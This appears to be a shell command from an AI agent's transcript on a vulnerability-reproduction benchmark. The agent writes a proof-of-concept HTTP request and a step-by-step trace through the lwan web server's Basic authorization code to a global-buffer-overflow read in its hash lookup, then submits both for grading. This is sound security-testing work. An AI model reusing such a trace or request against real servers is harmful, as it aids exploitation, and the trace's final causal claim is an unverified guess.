Running command: cd /workspace && python3 - <<'PY'
import json,base64,os,subprocess,sys
poc='/tmp/poc2'
req=b'GET /admin HTTP/1.1\r\nHost: x\r\nAuthorization: Basic '+base64.b64encode(b'foo:bar')+b'\r\n\r\n'
open(poc,'wb').write(req)
trace=[
{"step":1,"file":"src-vul/lwan/src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1619,"var":"data_copy","code":"memcpy(data_copy, data, length);","note":"Attacker-controlled bytes are copied into the mutable fuzz buffer used by the HTTP parser."},
{"step":2,"file":"src-vul/lwan/src/lib/lwan-request.c","function":"parse_http_request","line":1174,"var":"parse_headers(...)","code":"if (UNLIKELY(!parse_headers(helper, buffer, helper->buffer->value + helper->buffer->len)))","note":"The request headers are parsed from the attacker-controlled buffer."},
{"step":3,"file":"src-vul/lwan/src/lib/lwan-request.c","function":"parse_headers","line":548,"var":"helper->authorization","code":"helper->authorization = HEADER(\"Authorization\");","note":"The Authorization header is stored as a slice into the request buffer."},
{"step":4,"file":"src-vul/lwan/src/lib/lwan-http-authorize.c","function":"lwan_http_authorize","line":157,"var":"authorization->value","code":"authorization->value += basic_len; authorization->len -= basic_len;","note":"The Basic prefix is removed, leaving the base64 credentials."},
{"step":5,"file":"src-vul/lwan/src/lib/lwan-http-authorize.c","function":"authorize","line":137,"var":"decoded","code":"decoded = base64_decode((unsigned char *)authorization->value, authorization->len, &decoded_len);","note":"The credentials are decoded into a new buffer."},
{"step":6,"file":"src-vul/lwan/src/lib/lwan-http-authorize.c","function":"authorize","line":147,"var":"looked_password","code":"looked_password = hash_find(rpf->entries, decoded);","note":"The decoded username is used as the hash lookup key."},
{"step":7,"file":"src-vul/lwan/src/lib/hash.c","function":"hash_find_entry","line":429,"var":"hash->key_compare(key, entry->key)","code":"if (hash->key_compare(key, entry->key) == 0)","note":"The string comparator reads the attacker-controlled key while searching the bucket entries."},
{"step":8,"file":"src-vul/lwan/src/lib/hash.c","function":"hash_find_entry","line":429,"var":"entry->key","code":"if (hash->key_compare(key, entry->key) == 0)","note":"A malformed or unterminated decoded username can make the comparator read past the end of the global string storage, matching the reported global-buffer-overflow READ."}
]
open('/workspace/candidate_trace.json','w').write(json.dumps(trace,indent=2))
print('wrote trace and poc')
PY
bash ./submit.sh /tmp/poc2 /workspace/candidate_trace.json
